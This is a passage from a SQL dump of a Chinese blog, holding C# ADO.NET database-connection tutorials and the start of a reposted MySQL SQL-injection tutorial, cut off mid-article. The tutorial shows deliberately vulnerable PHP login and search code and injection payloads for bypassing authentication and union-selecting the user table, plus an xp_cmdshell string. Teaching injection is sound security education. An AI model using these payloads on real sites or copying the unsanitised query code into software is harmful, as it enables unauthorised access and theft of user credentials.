/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.SelectCommand = cmd;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRow row = ds.Tables[0].NewRow();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; row[&quot;UserName&quot;] = &quot;lhhhhhhhhhhhh&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; row[&quot;UserSex&quot;] = 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[0].Rows.Add(row);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Update(ds);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Dispose();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Dispose();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn.Dispose();</p>\r\n\r\n<p>(2) 使用 sqldataadapter 中的 insertcommand：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlConnection conn=new SqlConnection();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn.ConnectionString=ConfigurationManager.ConnectionStrings[&quot;TestDBConnectionString&quot;].ConnectionString;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn.Open();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommand cmd=new SqlCommand();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.CommandText=&quot;select * from UserInfo&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.CommandType=CommandType.Text;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Connection=conn;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.SelectCommand = cmd;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Fill(ds);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRow row = ds.Tables[0].NewRow();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; row[&quot;UserName&quot;] = &quot;ccccjjjjjjjjjjj&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; row[&quot;UserSex&quot;] = 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.Tables[0].Rows.Add(row);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.CommandText = &quot;insert into UserInfo values(@username,@usersex)&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.InsertCommand=cmd;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Parameters.Add(new SqlParameter(&quot;@username&quot;,SqlDbType.VarChar,50));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Parameters.Add(new SqlParameter(&quot;@usersex&quot;, SqlDbType.Bit));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Parameters[0].SourceColumn = &quot;UserName&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Parameters[0].SourceVersion = DataRowVersion.Original;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Parameters[1].SourceColumn = &quot;UserSex&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Parameters[1].SourceVersion = DataRowVersion.Original;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Update(ds);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adapter.Dispose();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Dispose();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn.Dispose();</p>\r\n',0,1438329650,0,0),(152,38,'C#的数据库连接使用方式汇总(转载)','<p>摘录：sql dataGrid连接数据库<br />\r\n&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />\r\nusing System.Data.SqlClient;</p>\r\n\r\n<p>namespace sqlconnect3<br />\r\n{<br />\r\n///<br />\r\n/// Summary description for Form1.<br />\r\n///<br />\r\npublic class Form1 : System.Windows.Forms.Form<br />\r\n{<br />\r\nprivate System.Windows.Forms.DataGrid dataGrid1;<br />\r\nprivate System.Data.SqlClient.SqlCommand s qlSelectCommand1;<br />\r\nprivate System.Data.SqlClient.SqlCommand sqlInsertCommand1;<br />\r\nprivate System.Data.SqlClient.SqlCommand sqlUpdateCommand1;<br />\r\nprivate System.Data.SqlClient.SqlCommand sqlDeleteCommand1;<br />\r\nprivate System.Data.SqlClient.SqlConnection sqlConnection1;<br />\r\nprivate System.Data.SqlClient.SqlDataAdapter sqlDataAdapter1;<br />\r\n///<br />\r\n/// Required designer variable.<br />\r\n///<br />\r\nprivate System.ComponentModel.Container components = null;</p>\r\n\r\n<p>public Form1()<br />\r\n{<br />\r\n//<br />\r\n// Required for Windows Form Designer support<br />\r\n//<br />\r\nInitializeComponent();</p>\r\n\r\n<p>//<br />\r\n// TODO: Add any constructor code after InitializeComponent call<br />\r\n//<br />\r\nSqlConnection con=new SqlConnection(this.sqlConnection1.ConnectionString);</p>\r\n\r\n<p>SqlDataAdapter Dgb=new SqlDataAdapter(&rdquo;Select * From Address&rdquo;,con);<br />\r\nDataSet ds=new DataSet();<br />\r\nDgb.Fill(ds,&rdquo;Address&rdquo;);</p>\r\n\r\n<p>dataGrid1.DataSource=ds.Tables[&rdquo;Address&rdquo;].DefaultView;<br />\r\n}</p>\r\n\r\n<p>oracle 连接<br />\r\n&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />\r\nusing System;<br />\r\nusing System.Data;<br />\r\nusing System.Data.OleDb;<br />\r\nclass OracleTest<br />\r\n{<br />\r\nstatic void Main()<br />\r\n{<br />\r\nconst string strConn = &ldquo;PROVIDER=OraOLEDB.Oracle;DATA SOURCE=YourDataSrcName;USER ID=YourUID;PASSWORD=YourPassword;PLSQLRSet=1&Prime;;<br />\r\nconst string strSQL = &ldquo;Select * From YourTable&rdquo;;<br />\r\ntry<br />\r\n{</p>\r\n\r\n<p>OleDbConnection dbConn = new OleDbConnection(strConn);<br />\r\nDataSet ds = new DataSet(&rdquo;EmployeesSet&rdquo;);<br />\r\nOleDbDataAdapter da = new OleDbDataAdapter(strSQL,dbConn);<br />\r\nda.Fill(ds,&rdquo;Buyer&rdquo;);<br />\r\nConsole.WriteLine(ds.GetXml());<br />\r\n}<br />\r\ncatch(OleDbException e)<br />\r\n{<br />\r\nConsole.WriteLine(&rdquo;Exception Occured :{0}&rdquo;,e.Errors[0].Message);<br />\r\n}</p>\r\n\r\n<p>}<br />\r\n}</p>\r\n\r\n<p>1：SqlServer连本地数据库<br />\r\nSqlConnection myConnection = new SqlConnection(&rdquo;server=(local)\\\\NetSDK;database=pubs;Trusted_Connection=yes&rdquo;);<br />\r\nSqlDataAdapter myCommand = new SqlDataAdapter(&rdquo;select * from Titles&rdquo;, myConnection);<br />\r\nDataSet ds = new DataSet();<br />\r\nmyCommand.Fill(ds, &ldquo;Titles&rdquo;);<br />\r\nMyRepeater.DataSource = ds.Tables[&rdquo;Titles&rdquo;].DefaultView;<br />\r\nMyRepeater.DataBind();<br />\r\n2：SqlServer连服务器绑定DataGrid连接<br />\r\nSqlConnection myConnection;<br />\r\nmyConnection = new SqlConnection (&rdquo; user id=;password=;initial catalog=MMAS;data source=MMASS;Connect Timeout=30&Prime;);<br />\r\nmyConnection.Open ();<br />\r\nstring strSel=&rdquo;select * from bas_item &ldquo;;<br />\r\nSqlDataAdapter myAdapter= new SqlDataAdapter (strSel,myConnection);<br />\r\nDataSet ds=new DataSet ();<br />\r\nmyAdapter.Fill (ds,&rdquo;bas_item&rdquo;);<br />\r\nDataGrid1.DataSource =ds.Tables [&rdquo;bas_item&rdquo;].DefaultView;<br />\r\nDataGrid1.DataBind ();<br />\r\n3：Access连接<br />\r\nstring MyConnString=&rdquo;provider=Microsoft.Jet.OLEDB.4.0;Data Source=d://demo//db1.mdb&rdquo;;// &ldquo;+Server.MapPath(&rdquo;db1.mdb&rdquo;)+&rdquo;&quot;;<br />\r\nMyConn= new OleDbConnection(MyConnString);<br />\r\nMyConn.Open();<br />\r\nstring strSel = &ldquo;select * from u&rdquo;;<br />\r\nDataSet ds = new DataSet();<br />\r\nOleDbDataAdapter MyAdapter = new OleDbDataAdapter(strSel,MyConn);<br />\r\nMyAdapter.Fill(ds,&rdquo;u&rdquo;);<br />\r\nDataGrid2.DataSource = ds.Tables [&rdquo;u&rdquo;].DefaultView<br />\r\nDataGrid2.DataBind();<br />\r\n目前在c#里两个连接类:SqlConnection与OleDbConnection.<br />\r\n两个类的例程分别如下：(from msdn)<br />\r\n1.OleDbConnection:<br />\r\npublic void InsertRow(string myConnectionString)<br />\r\n{<br />\r\n// If the connection string is null, use a default.<br />\r\nif(myConnectionString == &ldquo;&rdquo;)<br />\r\n{<br />\r\nmyConnectionString = &ldquo;Provider=SQLOLEDB;Data Source=localhost;Initial Catalog=Northwind;&rdquo; +<br />\r\n&ldquo;Integrated Security=SSPI;&rdquo;;<br />\r\n}<br />\r\nOleDbConnection myConnection = new OleDbConnection(myConnectionString);<br />\r\nstring myInsertQuery = &ldquo;INSERT INTO Customers (CustomerID, CompanyName) Values(&rsquo;NWIND&rsquo;, &lsquo;Northwind Traders&rsquo;)&rdquo;;<br />\r\nOleDbCommand myCommand = new OleDbCommand(myInsertQuery);<br />\r\nmyCommand.Connection = myConnection;<br />\r\nmyConnection.Open();<br />\r\nmyCommand.ExecuteNonQuery();<br />\r\nmyCommand.Connection.Close();<br />\r\n}<br />\r\n2.SqlConnection:<br />\r\npublic void InsertRow(string myConnectionString)<br />\r\n{<br />\r\n// If the connection string is null, use a default.<br />\r\nif(myConnectionString == &ldquo;&rdquo;)<br />\r\n{<br />\r\nmyConnectionString = &ldquo;Initial Catalog=Northwind;Data Source=localhost;Integrated Security=SSPI;&rdquo;;<br />\r\n}<br />\r\nSqlConnection myConnection = new SqlConnection(myConnectionString);<br />\r\nstring myInsertQuery = &ldquo;INSERT INTO Customers (CustomerID, CompanyName) Values(&rsquo;NWIND&rsquo;, &lsquo;Northwind Traders&rsquo;)&rdquo;;<br />\r\nSqlCommand myCommand = new SqlCommand(myInsertQuery);<br />\r\nmyCommand.Connection = myConnection;<br />\r\nmyConnection.Open();<br />\r\nmyCommand.ExecuteNonQuery();<br />\r\nmyCommand.Connection.Close();<br />\r\n}<br />\r\n注:<br />\r\nSqlConnection针对于Sql server 7.0及以后版本。<br />\r\nOleDbConnection用于其他数据库。<br />\r\n至于myConnectinString里的provider参数，针对不同的数据源有:<br />\r\n(1)driver da microsoft para arquivos textto(*.txt,*.csv)<br />\r\n(2)driver do microsoft access(*.mdb)<br />\r\n(3)driver do microsoft dbase(*.dbf)<br />\r\n(4)driver do microsoft execl(*.xls)<br />\r\n(5)driver do microsoft paradox(*.db)<br />\r\n(6)Microsoft Access Driver(*.mdb)<br />\r\n(7)Microsoft Access -treiber(*.mdb)<br />\r\n(8)Microsoft Excel driver(*.xls)<br />\r\n一、概述SqlClient是一个数据提供程序，其地位与OracleClient、Odbc、OleDb相当。可以协助应用程序快速访问数据库。简 单地说，SqlClient的应用就是：利用SqlConnection连接数据库，数据源由SqlCommand确定；利用 SqlDataAdapter来桥接DataSet与数据源。如果想自动同步DataSet与数据库，SqlCommandBuild就有用了。如果你只 想读而不想更改数据，那么用SqlDataReader吧。当然了，事务是必不可少的，SqlTransaction就是用来做这事的。出错啦&mdash;&mdash;SQL Server返回错误时，会引发SqlException异常，同时创建SqlError与SqlErrorCollection。SqlParameter及SqlParameterCollection是什么意思？如何保证数据库访问安全级别&mdash;&mdash;SqlClientPermission与SqlClientPermissionAttribute。有两种访问数据库的方式：1、仅使用SqlCommand与SqlConnection访问数据库。在这种情况下，SqlCommand的内容通常为跟更新数据库有关的SQL。例：public void insertRow(){string myConnectionString = &ldquo;Initial Catalog=Northwind;Data Source=localhost;Integrated Security=SSPI;&rdquo;;SqlConnection myConnection = new SqlConnection(myConnectionString);String myInsertQuery = &ldquo;insert into Customers (customerID,companyName) values (&rsquo;NWIND&rsquo;, &lsquo;Northwind Traders&rsquo;)&rdquo;;SqlCommand myCommand = new SqlCommand(myInsertQuery);MyCommand.Connection = myConnection;MyCommand.Open();MyCommand.ExecuteNonQuery();MyCommand.Collection.Close();}2、使用SqlCommand与SqlConnection、SqlDataAdapter、DataSet访问数据库。在这种情况下，SqlCommand的内容通常为查询。例：public DataSet SelectSqlRows(DataSet dataSet,string connection,string query){SqlConnection conn = new SqlConnection(connection);SqlDataAdapter adapter = new SqlDataAdapter();Adapter.SelectCommand = new SqlCommand(query,conn);Adapter.Fill(dataSet);Return dataSet;}二、SqlConnectionSqlConnection表示与数据源的一个唯一的会话。必须使用close或dispose关闭。如果执行SqlCommand生成SqlException时，严重度小于等于19时，不会关闭连接。大于19时会关闭连接。三、SqlCommand表示要对数据库执行的一个Sql或存储过程。有四种方式：ExecuteReader：主要用于Select等查询语句。例：cmd.CommandText = &ldquo;select a,b from k&rdquo;;SqlDataReader myReader = cmd.ExecuteReader();</p>\r\n\r\n<p>Try</p>\r\n\r\n<p>{</p>\r\n\r\n<p>while (myReader.Read())</p>\r\n\r\n<p>{</p>\r\n\r\n<p>Console.WriteLine(myReader.GetInt32(0)+&rdquo; &ldquo;+myReader.GetInt32(1));</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>catch</p>\r\n\r\n<p>{</p>\r\n\r\n<p>myReader.Close();</p>\r\n\r\n<p>//关闭连接</p>\r\n\r\n<p>}</p>\r\n\r\n<p>ExecuteNonQuery：主要用于数据库操作语句。ExecuteScalar：主要用于聚合查询语句，或返回一个值的查询，或结果集中第一行的第一列或空引用（如果结果集为空）。例：</p>\r\n\r\n<p>Cmd.CommandText = &ldquo;select count(*) from orders&rdquo;;<br />\r\nInt32 I = (Int32)cmd.ExecuteScalar();ExecuteXMLReader：将 CommandText 发送到 Connection 并生成一个 XmlReader 对象。四、SqlDataReader上面已举过例了。需要说明的是：在读数之前，SqlDataReader默认位置在所有记录前。需调用Read()来访问数据。Read()的作用是行进到下一条记录，是Bool型的，如有记录返true，否则返false。四、SqlDataAdapter用得较多了。五、事务DataSet中的事务只用于DataSet，真正的事务控制在这里进行。一般的过程是这样的：//建立并打开连接SqlConnection conn = new SqlConnection(&hellip;&hellip;&hellip;&hellip;)；SqlConnection.Open();//创建myCommand；SqlCommand myCommand = SqlConnection.CreateCommand();//创建事务SqlTransaction trans = SqlConnection.BeginTransaction(IsolationLevel.ReadCommitted,&rdquo;SampleTransaction&rdquo;);//将事务、连接与Command对象相关MyCommand.Connection = myConnection; //这句是多余的，上面已有同样功能MyCommand.Transaction = trans;</p>\r\n\r\n<p>Try{myCommand.CommandText = &ldquo; &ldquo;;myCommand.ExcuteNonQuery();trans.Commit(); //提交事务}catch(SqlException s){trans.Rollback(&ldquo;SampleTransaction&rdquo;); //回滚事务}从这个程序可以很清楚地表明：事务是由SqlConnection创建，并必须关联到SqlCommand，最后由事务自身来进行提交或回滚操作的。同时可以看到：一个连接可以打开多个不同名的事务。还有：IsolationLevel事务隔离级别（枚举）有如下几种：Chaos：无法改写隔离级别更高的事务中挂起的操作。ReadCommitted：在正在读取数据时保持共享锁，避免脏读。ReadUncommitted：可以脏读。RepeatableRead：可重复读取。Serializable：最高级别。分别与SQL Server中四种隔离级别对应。</p>\r\n',0,1438329742,0,0),(153,42,'Mysql注入:SQL Injection with MySQL(一)','<p>本文已经发表在《黑客防线》7月刊，转载请注明。由于写了很久，随着技术的进步，本人也发现该文里有不少错误和罗嗦的地方。请各位高手看了不要笑。本文写于《Advanced SQL Injection with MySQL》之前一个月。</p>\r\n\r\n<p>声明</p>\r\n\r\n<p>本文仅用于教学目的，如果因为本文造成的攻击后果本人概不负责，本文所有代码均为本人所写，所有数据均经过测试。绝对真实。如果有什么遗漏或错误，欢迎来安全天使论坛（http://www.4ngel.net/forums）和我交流。</p>\r\n\r\n<p>前言</p>\r\n\r\n<p>2003年开始，喜欢脚本攻击的人越来越多，而且研究ASP下注入的朋友也逐渐多了起来，我看过最早的关于SQL注入的文章是一篇99年国外的高手写的，而现在国外的已经炉火纯青了，国内才开始注意这个技术，由此看来，国内的这方面的技术相对于国外还是有一段很大差距，话说回来，大家对SQL注入攻击也相当熟悉了，国内各大站点都有些堪称经典的作品，不过作为一篇完整的文章，我觉得还是有必要再说说其定义和原理。如果哪位高手已经达到炉火纯青的地步，不妨给本文挑点刺。权当指点小弟。</p>\r\n\r\n<p>关于php+Mysql的注入</p>\r\n\r\n<p>国内能看到php+Mysql注入的文章可能比较少，但是如果关注各种WEB程序的漏洞，就可以发现，其实这些漏洞的文章其实就是一个例子。不过由于国内研究PHP的人比研究ASP的人实在少太多，所以，可能没有注意，况且PHP的安全性比ASP高很多，导致很多人不想跨越这个门槛。<br />\r\n尽管如此，在PHP站点日益增多的今天，SQL注入仍是最有效最麻烦的一种攻击方式，有效是因为至少70% 以上的站点存在SQL Injection漏洞，包括国内大部分安全站点，麻烦是因为MYSQL4以下的版本是不支持子语句的，而且当php.ini里的 magic_quotes_gpc 为On 时。提交的变量中所有的 &#39; (单引号), &quot; (双引号), (反斜线) and 空字符会自动转为含有反斜线的转义字符。给注入带来不少的阻碍。<br />\r\n早期的时候，根据程序的代码，要构造出没有引号的语句形成有效的攻击，还真的有点困难，好在现在的技术已经构造出不带引号的语句应用在某些场合。只要有经验，其实构造有效的语句一点也不难，甚至成功率也很高，但具体情况具体分析。首先要走出一个误区。</p>\r\n\r\n<p>注：在没有具体说明的情况下，我们假设magic_quotes_gpc均为off。</p>\r\n\r\n<p>php+Mysql注入的误区</p>\r\n\r\n<p>很多人认为在PHP+MYSQL下注入一定要用到单引号，或者是没有办法像MSSQL那样可以使用&ldquo;declare @a sysname select @a=&lt;command&gt; exec master.dbo.xp_cmdshell @a&rdquo;这类的命令来消除引号，其实这个是大家对注入的一种误解或这说是对注入认识上的一种误区。<br />\r\n为什么呢？因为不管在什么语言里，在引号（包括单双）里，所有字符串均是常量，即使是dir这样的命令，也紧紧是字符串而已，并不能当做命令执行，除非是这样写的代码：<br />\r\n$command = &quot;dir c:&quot;;<br />\r\nsystem($command);</p>\r\n\r\n<p>否则仅仅只是字符串，当然，我们所说的命令不单指系统命令，我们这里说的是SQL语句，要让我们构造的SQL语句正常执行，就不能让我们的语句变成字符串，那么什么情况下会用单引号？什么时候不用呢？看看下面两句SQL语句：<br />\r\n①SELECT * FROM article WHERE articleid=&#39;$id&#39;<br />\r\n②SELECT * FROM article WHERE articleid=$id</p>\r\n\r\n<p>两种写法在各种程序中都很普遍，但安全性是不同的，第一句由于把变量$id放在一对单引号中，这样使得我们所提交的变量都变成了字符串，即使包含了正确的SQL语句，也不会正常执行，而第二句不同，由于没有把变量放进单引号中，那我们所提交的一切，只要包含空格，那空格后的变量都会作为SQL语句执行，我们针对两个句子分别提交两个成功注入的畸形语句，来看看不同之处。</p>\r\n\r\n<p>① 指定变量$id为：<br />\r\n1&#39; and 1=2 union select * from user where userid=1/*<br />\r\n此时整个SQL语句变为：<br />\r\nSELECT * FROM article WHERE articleid=&#39;1&#39; and 1=2 union select * from user where userid=1/*&#39;</p>\r\n\r\n<p>②指定变量$id为：<br />\r\n1 and 1=2 union select * from user where userid=1<br />\r\n此时整个SQL语句变为：<br />\r\nSELECT * FROM article WHERE articleid=1 and 1=2 union select * from user where userid=1</p>\r\n\r\n<p>看出来了吗？由于第一句有单引号，我们必须先闭合前面的单引号，这样才能使后面的语句作为SQL执行，并要注释掉后面原SQL语句中的后面的单引号，这样才可以成功注入，如果php.ini中magic_quotes_gpc设置为on或者变量前使用了addslashes()函数，我们的攻击就会化为乌有，但第二句没有用引号包含变量，那我们也不用考虑去闭合、注释，直接提交就OK了。<br />\r\n大家看到一些文章给出的语句中没有包含单引号例如pinkeyes的《php注入实例》中给出的那句SQL语句，是没有包含引号的，大家不要认为真的可以不用引号注入，仔细看看PHPBB的代码，就可以发现，那个$forum_id所在的SQL语句是这样写的：</p>\r\n\r\n<p>$sql = &quot;SELECT *<br />\r\nFROM &quot; . FORUMS_TABLE . &quot;<br />\r\nWHERE forum_id = $forum_id&quot;;</p>\r\n\r\n<p>由于没有用单引号包含变量，才给pinkeyes这个家伙有机可乘，所以大家在写PHP程序的时候，记得用单引号把变量包含起来。当然，必要的安全措施是必不可少的。</p>\r\n\r\n<p>简单的例子</p>\r\n\r\n<p>先举一个例子来给大家了解一下PHP下的注入的特殊性和原理。当然，这个例子也可以告诉大家如何学习构造有效的SQL语句。<br />\r\n我们拿一个用户验证的例子，首先建立一个数据库和一个数据表并插入一条记录，如下：</p>\r\n\r\n<p>CREATE TABLE `user` (<br />\r\n`userid` int(11) NOT NULL auto_increment,<br />\r\n`username` varchar(20) NOT NULL default &#39;&#39;,<br />\r\n`password` varchar(20) NOT NULL default &#39;&#39;,<br />\r\nPRIMARY KEY (`userid`)<br />\r\n) TYPE=MyISAM AUTO_INCREMENT=3 ;</p>\r\n\r\n<p>#<br />\r\n# 导出表中的数据 `user`<br />\r\n#</p>\r\n\r\n<p>INSERT INTO `user` VALUES (1, &#39;angel&#39;, &#39;mypass&#39;);</p>\r\n\r\n<p>验证用户文件的代码如下：</p>\r\n\r\n<p>&lt;?php<br />\r\n$servername = &quot;localhost&quot;;<br />\r\n$dbusername = &quot;root&quot;;<br />\r\n$dbpassword = &quot;&quot;;<br />\r\n$dbname = &quot;injection&quot;;</p>\r\n\r\n<p>mysql_connect($servername,$dbusername,$dbpassword) or die (&quot;数据库连接失败&quot;);</p>\r\n\r\n<p>$sql = &quot;SELECT * FROM user WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;&quot;;</p>\r\n\r\n<p>$result = mysql_db_query($dbname, $sql);<br />\r\n$userinfo = mysql_fetch_array($result);</p>\r\n\r\n<p>if (empty($userinfo))<br />\r\n{<br />\r\necho &quot;登陆失败&quot;;<br />\r\n} else {<br />\r\necho &quot;登陆成功&quot;;<br />\r\n}</p>\r\n\r\n<p>echo &quot;&lt;p&gt;SQL Query:$sql&lt;p&gt;&quot;;<br />\r\n?&gt;</p>\r\n\r\n<p>这时我们提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39; or 1=1</p>\r\n\r\n<p>就会返回：</p>\r\n\r\n<p>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in F:wwwinjectionuser.php on line 13<br />\r\n登陆失败</p>\r\n\r\n<p>SQL Query:SELECT * FROM user WHERE username=&#39;angel&#39; or 1=1&#39; AND password=&#39;&#39;</p>\r\n\r\n<p>PHP Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in F:wwwinjectionuser.php on line 13</p>\r\n\r\n<p>看到了吗？单引号闭合后，并没有注释掉后面的单引号，导致单引号没有正确配对，所以由此可知我们构造的语句不能让Mysql正确执行，要重新构造：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39; or &#39;1=1</p>\r\n\r\n<p>这时显示&ldquo;登陆成功&rdquo;，说明成功了。或者提交：</p>\r\n\r\n<p>http://127.0.0.1/injection/user.php?username=angel&#39;/*<br />\r\nhttp://127.0.0.1/injection/user.php?username=angel&#39;%23</p>\r\n\r\n<p>这样就把后面的语句给注释掉了！说说这两种提交的不同之处，我们提交的第一句是利用逻辑运算，在ASP中运用可以说是非常广泛的，这个不用说了吧？第二、三句是根据mysql的特性，mysql支持/*和#两种注释格式，所以我们提交的时候是把后面的代码注释掉，值得注意的是由于编码问题，在IE地址栏里提交#会变成空的，所以我们在地址栏提交的时候，应该提交%23，才会变成#，就成功注释了，这个比逻辑运算简单得多了，由此可以看出PHP比ASP强大灵活多了。<br />\r\n通过上面的例子大家应该对PHP+MYSQL的注入有个感性的认识了吧？</p>\r\n\r\n<p>语句构造</p>\r\n\r\n<p>PHP+MYSQL注入的博大精深不仅仅体现在认证体系的饶过，语句的构造才是最有趣味的地方，但构造语句和ACCESS、MSSQL都有少许不同，但同样可以发挥得淋漓尽致。看下面的例子。</p>\r\n\r\n<p>一、搜索引擎</p>\r\n\r\n<p>网上有一大堆的PHP程序搜索引擎是有问题的，也就是提交特殊字符可以显示所有记录，包括不符合条件的，其实这个危害也不算大，因为允许用户输入关键字进行模糊查询的地方大多数都允许检索所有的记录。很多查询的设计就是这样的。<br />\r\n查询是只读的操作应该不会对数据产生破坏作用，不要太担心。不过泄露隐私不知道算不算危害，下面是一个标准的搜索引擎：</p>\r\n\r\n<p>&lt;form method=&quot;GET&quot; action=&quot;search.php&quot; name=&quot;search&quot;&gt;<br />\r\n&lt;input name=&quot;keywords&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;15&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;<br />\r\n&lt;/form&gt;<br />\r\n&lt;p&gt;&lt;b&gt;Search result&lt;/b&gt;&lt;/p&gt;</p>\r\n\r\n<p>&lt;?php<br />\r\n$servername = &quot;localhost&quot;;<br />\r\n$dbusername = &quot;root&quot;;<br />\r\n$dbpassword = &quot;&quot;;<br />\r\n$dbname = &quot;injection&quot;;</p>\r\n\r\n<p>mysql_connect($servername,$dbusername,$dbpassword) or die (&quot;数据库连接失败&quot;);</p>\r\n\r\n<p>$keywords = $_GET[&#39;keywords&#39;];<br />\r\nif (!empty($keywords)) {<br />\r\n//$keywords = addslashes($keywords);<br />\r\n//$keywords = str_replace(&quot;_&quot;,&quot;_&quot;,$keywords);<br />\r\n//$keywords = str_replace(&quot;%&quot;,&quot;%&quot;,$keywords);</p>\r\n\r\n<p>$sql = &quot;SELECT * FROM &quot;.$db_prefix.&quot;article WHERE title LIKE &#39;%$keywords%&#39; $search ORDER BY title DESC&quot;;<br />\r\n$result = mysql_db_query($dbname,$sql);<br />\r\n$tatol=mysql_num_rows($result);</p>\r\n\r\n<p>echo &quot;&lt;p&gt;SQL 